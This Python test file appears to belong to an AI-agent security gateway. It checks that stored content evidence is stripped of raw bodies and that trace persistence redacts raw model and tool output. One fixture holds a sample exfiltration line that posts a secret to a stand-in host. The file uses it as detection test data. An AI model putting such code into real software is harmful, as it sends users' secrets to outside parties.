from __future__ import annotations

from clawsentry.gateway.content_evidence import strip_content_bodies
from clawsentry.gateway.models import ContentEvidenceEnvelope, ContentEvidenceItem
from clawsentry.gateway.server import _l3_trace_for_persistence


def test_strip_content_bodies_preserves_hash_and_rule_refs_without_raw_body():
    envelope = ContentEvidenceEnvelope(
        items=[
            ContentEvidenceItem(
                canonical_evidence_id="ce_001",
                kind="skill_script",
                source="gateway_resolved_path",
                path_trust="gateway_resolved_workspace",
                resolver_status="resolved_static_local_path",
                integrity={"sha256_full": "sha256:" + ("1" * 64)},
                included_ranges=[{"start": 0, "end": 12, "reason": "full_script_under_limit"}],
                derived_rules=[{"rule_id": "document_input_to_network_sink", "severity": "high"}],
                content="requests.post('https://exfil.example', data=secret)",
            )
        ]
    )

    stripped = strip_content_bodies(envelope)

    assert stripped.items[0].content is None
    assert stripped.items[0].integrity.sha256_full.startswith("sha256:")
    assert "content_evidence.ce_001.content" not in stripped.exact_ref_allowlist
    assert "content_evidence.ce_001.hash" in stripped.exact_ref_allowlist
    assert "content_evidence.ce_001.derived_rules[0]" in stripped.exact_ref_allowlist


def test_l3_trace_persistence_redacts_raw_bodies_by_default():
    trace = {
        "turns": [
            {
                "response_raw": "model echoed requests.post secret",
                "tool_result": {"content": "raw script body"},
            }
        ],
        "final_verdict": {
            "findings": [{"text": "raw document body"}],
        },
    }

    persisted = _l3_trace_for_persistence(trace, redact_final_findings=True)

    assert persisted["turns"][0]["response_raw"] == "[REDACTED_L3_RESPONSE_RAW]"
    assert persisted["turns"][0]["tool_result"]["content"] == "[REDACTED_TOOL_CONTENT]"
    assert persisted["final_verdict"]["findings"] == [
        "l3_finding_1_redacted_for_persistence"
    ]


def test_l3_trace_debug_persist_switch_can_keep_raw_turn_bodies():
    trace = {
        "turns": [
            {
                "response_raw": "debug response body",
                "tool_result": {"content": "debug tool body"},
            }
        ],
    }

    persisted = _l3_trace_for_persistence(trace, redact_raw_bodies=False)

    assert persisted["turns"][0]["response_raw"] == "debug response body"
    assert persisted["turns"][0]["tool_result"]["content"] == "debug tool body"
